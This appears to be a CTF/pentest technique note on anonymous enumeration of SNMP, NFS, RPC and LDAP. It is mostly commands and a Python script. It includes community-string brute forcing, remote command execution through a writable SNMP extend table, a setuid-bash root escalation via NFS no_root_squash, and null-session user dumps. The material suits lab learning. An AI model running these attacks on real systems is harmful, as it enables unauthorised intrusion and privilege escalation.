---
title: "SNMP, NFS, RPC and LDAP - Anonymous Enumeration"
category: misc
subcategory: network-services
type: technique
tags: [snmp, nfs, rpc, ldap, snmpwalk, onesixtyone, rpcclient, ldapsearch, showmount, no-root-squash, anonymous-bind, null-session, community-string, enumeration, ldapdomaindump]
difficulty: easy
summary: "Four commonly-open services that leak everything to anonymous clients: SNMP community strings, NFS exports, RPC null sessions, and LDAP anonymous binds."
when_to_use:
  - "UDP 161 (SNMP), 111/2049 (RPC/NFS), or 389/636/3268 (LDAP) are open"
  - "You want users, processes, mounts or directory objects without credentials"
  - "An NFS export is world-readable/writable and you want a privesc or foothold"
  - "You need to confirm a domain naming context before deeper AD work"
tools: [snmpwalk, onesixtyone, snmp-check, rpcclient, showmount, ldapsearch, ldapdomaindump, nmap]
related: [ad-enumeration-bloodhound, net-smb, net-scanning-fingerprinting]
---

## TL;DR

SNMP (161/udp), NFS (2049 via 111/rpcbind), RPC (111/135) and LDAP (389/636/3268) frequently
answer anonymous clients. SNMP `public` dumps processes and installed software; NFS `no_root_squash`
is a straight privesc; RPC null sessions leak users; LDAP anonymous binds leak the directory.

## Recognise it

- `161/udp open snmp` -- try `public`/`private` first.
- `111/tcp rpcbind` with `2049` mapped -- NFS is exported.
- `389/tcp ldap`, `3268/tcp globalcatalog` -- a directory (usually AD).

## Attack

### SNMP (161/udp)

```bash
# Brute the community string against a host
onesixtyone 10.10.10.5 public private manager
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.5

# Walk the whole tree with SNMPv2c and the found community
snmpwalk -v2c -c public 10.10.10.5

# snmp-check gives a readable summary (users, processes, software, net)
snmp-check -c public 10.10.10.5

# nmap NSE
nmap -sU -p161 --script "snmp-info,snmp-sysdescr,snmp-processes,snmp-win32-software,snmp-netstat" 10.10.10.5
```

High-value OIDs to walk directly:

```bash
# System description (OS, kernel)
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.1
# Running processes (hrSWRunName)
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.4.2.1.2
# Full command lines of processes (hrSWRunParameters -- creds on the CLI!)
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.4.2.1.5
# Installed software (hrSWInstalledName)
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.6.3.1.2
# Listening TCP connections (tcpConnState)
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.6.13.1.3
# Windows local user accounts (extended OID)
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.4.1.77.1.2.25
```

If you find a **write** community string, NET-SNMP's `extend`/`exec` MIB can run commands:

```bash
# Test write access
snmpset -v2c -c private 10.10.10.5 1.3.6.1.2.1.1.6.0 s "test"

# With a writable NET-SNMP extend table, define a command and read its output
snmpset -v2c -c private 10.10.10.5 'nsExtendStatus."cmd"' i 5 \
  'nsExtendCommand."cmd"' s /bin/sh 'nsExtendArgs."cmd"' s '-c id'
snmpwalk -v2c -c private 10.10.10.5 nsExtendObjects
```

### NFS (111 / 2049)

```bash
# List exports and who they are shared to
showmount -e 10.10.10.5

# rpcinfo confirms mountd/nfs are registered
rpcinfo -p 10.10.10.5

# Mount an export (nolock avoids hangs on CTF boxes)
sudo mkdir -p /mnt/nfs
sudo mount -t nfs -o nolock,vers=3 10.10.10.5:/export /mnt/nfs

# Browse and search
ls -la /mnt/nfs
grep -rniE 'password|id_rsa|flag' /mnt/nfs
```

**no_root_squash privesc**: if the export allows root, place a setuid-root binary as root from
your box and execute it as a normal user on the target after it lands in a directory the target can run.

```bash
# On your box (you are root), on the mounted export:
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chown root:root /mnt/nfs/rootbash
sudo chmod 4755 /mnt/nfs/rootbash
# Then on the target shell (any user): /export/rootbash -p  -> uid 0
```

**UID spoofing**: if the export squashes root but files belong to uid 1005, create a matching local
user so your writes/reads are permitted.

```bash
# Make a local user with the target's file owner uid, then su to it before touching the mount
sudo useradd -u 1005 nfsuser
sudo -u nfsuser cat /mnt/nfs/secret.txt
```

### RPC / rpcbind (111 / 135)

```bash
# Enumerate registered RPC programs
rpcinfo -p 10.10.10.5

# Windows RPC null session via rpcclient
rpcclient -U '' -N 10.10.10.5

# Then inside rpcclient, or as -c one-liners:
rpcclient -U '' -N 10.10.10.5 -c 'srvinfo'
rpcclient -U '' -N 10.10.10.5 -c 'enumdomusers'
rpcclient -U '' -N 10.10.10.5 -c 'enumdomgroups'
rpcclient -U '' -N 10.10.10.5 -c 'querydominfo'
rpcclient -U '' -N 10.10.10.5 -c 'queryuser 500'
rpcclient -U '' -N 10.10.10.5 -c 'lsaquery'
rpcclient -U '' -N 10.10.10.5 -c 'lsaenumsid'
rpcclient -U '' -N 10.10.10.5 -c 'enumprivs'
```

### LDAP (389 / 636 / 3268)

```bash
# Read the naming contexts (the base DN you will query under)
ldapsearch -x -H ldap://10.10.10.5 -s base namingContexts

# Full anonymous dump of a base DN
ldapsearch -x -H ldap://10.10.10.5 -b 'DC=corp,DC=local'

# Global catalog (port 3268) sometimes allows more anonymous read
ldapsearch -x -H ldap://10.10.10.5:3268 -b 'DC=corp,DC=local'

# LDAPS if plaintext is blocked (ignore cert with LDAPTLS_REQCERT=never)
LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.10.10.5 -b 'DC=corp,DC=local'

# Authenticated bind
ldapsearch -x -H ldap://10.10.10.5 -D 'jdoe@corp.local' -w 'Summer2024!' -b 'DC=corp,DC=local'

# Bulk dump to HTML/JSON
ldapdomaindump -u 'corp.local\jdoe' -p 'Summer2024!' 10.10.10.5 -o ldd/

# Targeted queries with windapsearch
windapsearch -d corp.local --dc-ip 10.10.10.5 -u jdoe -p 'Summer2024!' -U
```

Grep the LDAP dump for `userPassword`, `description`, `info`, `unixUserPassword` and any custom
attribute -- CTF authors love hiding creds in `description`.

## Code

Community-string sprayer + high-value OID dumper using pysnmp-free shelling out to snmpwalk, so it
works anywhere the standard tools are installed.

```python
#!/usr/bin/env python3
"""Spray SNMP community strings then dump the high-value OIDs on a hit.

Requires snmpwalk (net-snmp) in PATH.

Usage:
    python3 snmp_loot.py 10.10.10.5 [community1 community2 ...]
"""
from __future__ import annotations

import subprocess
import sys

DEFAULT_COMMUNITIES = ["public", "private", "manager", "community", "cisco", "admin"]

OIDS = {
    "system": "1.3.6.1.2.1.1.1",
    "processes": "1.3.6.1.2.1.25.4.2.1.2",
    "proc-cmdline": "1.3.6.1.2.1.25.4.2.1.5",
    "software": "1.3.6.1.2.1.25.6.3.1.2",
    "tcp-conns": "1.3.6.1.2.1.6.13.1.3",
    "win-users": "1.3.6.1.4.1.77.1.2.25",
}


def walk(host: str, community: str, oid: str) -> str:
    """Run snmpwalk for one OID, returning output or empty string."""
    try:
        proc = subprocess.run(
            ["snmpwalk", "-v2c", "-c", community, "-t", "3", "-r", "1", host, oid],
            capture_output=True, text=True, timeout=25,
        )
        return proc.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


def find_community(host: str, communities: list[str]) -> str | None:
    """Return the first community string that yields any data."""
    for c in communities:
        if walk(host, c, "1.3.6.1.2.1.1.1"):
            return c
    return None


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 1
    host = argv[1]
    communities = argv[2:] if len(argv) > 2 else DEFAULT_COMMUNITIES
    hit = find_community(host, communities)
    if not hit:
        print("[-] no working community string")
        return 0
    print(f"[+] community string: {hit}\n")
    for label, oid in OIDS.items():
        data = walk(host, hit, oid)
        print(f"=== {label} ({oid}) ===")
        print(data if data else "(no data)")
        print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **SNMP is UDP** -- scans miss it easily; always probe 161 explicitly and retry (`-r 1`).
- **SNMPv3** uses users, not community strings; enumerate valid usernames and try known creds.
- **`proc-cmdline` OID** often contains passwords passed on the command line -- read it first.
- **NFS `nolock`** avoids the mount hanging on lockd; add `vers=3` for old servers.
- **no_root_squash** only helps if you can execute the setuid binary as a target user -- confirm the
  export path is reachable from your shell.
- **LDAP anonymous** access varies wildly; even a null bind that returns just the naming contexts
  is useful (it confirms the domain DN).
- **LDAPS cert errors**: `LDAPTLS_REQCERT=never` for self-signed CTF certs.

## Tools

- `snmpwalk`, `snmpset`, `snmp-check`, `onesixtyone` -- SNMP.
- `showmount`, `mount.nfs`, `rpcinfo` -- NFS/RPC.
- `rpcclient` -- Windows RPC null-session enumeration.
- `ldapsearch`, `ldapdomaindump`, `windapsearch` -- LDAP.
- `nmap` NSE (`snmp-*`, `nfs-*`, `rpcinfo`, `ldap-*`).

## References

- RFC 1157/3416 (SNMP), RFC 1813 (NFSv3), RFC 4511 (LDAP).
- The NET-SNMP `nsExtend` MIB documentation for the write-community command trick.
- `man rpcclient` for the full command list.
